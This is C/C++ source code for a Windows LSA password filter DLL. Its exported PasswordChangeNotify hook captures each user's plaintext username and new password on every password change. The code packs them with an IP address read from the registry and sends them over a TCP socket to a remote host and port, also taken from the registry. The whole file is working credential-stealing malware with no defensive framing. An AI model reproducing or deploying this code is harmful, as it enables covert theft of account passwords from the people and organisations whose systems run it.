#include "lsanotif.h"

int sendCreds(char* creds)
{
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;

	char* ip = getIPReg(L"ipa");
	DWORD port = getPtReg();

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { return 1; }

	//Create a socket
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) { goto error; }

	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) { goto error; }

	if (send(s, creds, strlen(creds), 0) < 0) { goto error; }

	free(creds);
	free(ip);
	WSACleanup();
	return 0;

error:
	free(creds);
	free(ip);
	WSACleanup();
	return 1;
}


void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
{
	char* creds = (char*)malloc(150);
	char* eip = getIPReg(L"eip");

	sprintf(creds, "%ws\x11%ws\x12%s", username->Buffer, password->Buffer, eip);

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&sendCreds, creds, 0, NULL);
	
	free(eip);
}


extern "C" __declspec(dllexport)
BOOL WINAPI InitializeChangeNotify(void)
{
	return TRUE;
}

extern "C" __declspec(dllexport)
NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeID, PUNICODE_STRING NewPassword)
{
	SavePassword(UserName, NewPassword);
	return TRUE;
}

extern "C" __declspec(dllexport)
BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)
{
	return TRUE;
}

